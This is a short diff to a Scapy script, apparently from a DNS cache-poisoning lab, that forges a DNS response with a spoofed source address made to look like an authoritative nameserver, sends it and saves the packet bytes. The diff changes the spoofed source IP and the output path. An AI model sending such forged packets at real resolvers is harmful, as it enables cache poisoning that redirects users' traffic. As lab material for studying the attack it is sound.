@@ -19,7 +19,7 @@ dns = DNS(id=0xAAAA,
           qd=Qdsec,
           an=Anssec,
           ns=NSsec)
-ip = IP(dst='10.0.2.7', src='10.0.2.8')
+ip = IP(dst='10.0.2.7', src='199.43.135.53')
 
 udp = UDP(dport=33333, sport=53, chksum=0)
 
@@ -28,5 +28,5 @@ spoofed_packet = ip / udp / dns
 spoofed_packet.show()
 send(spoofed_packet)
 
-with open('lab3/ip_resp.bin', 'wb') as f:
+with open('ip_resp.bin', 'wb') as f:
     f.write(bytes(spoofed_packet))
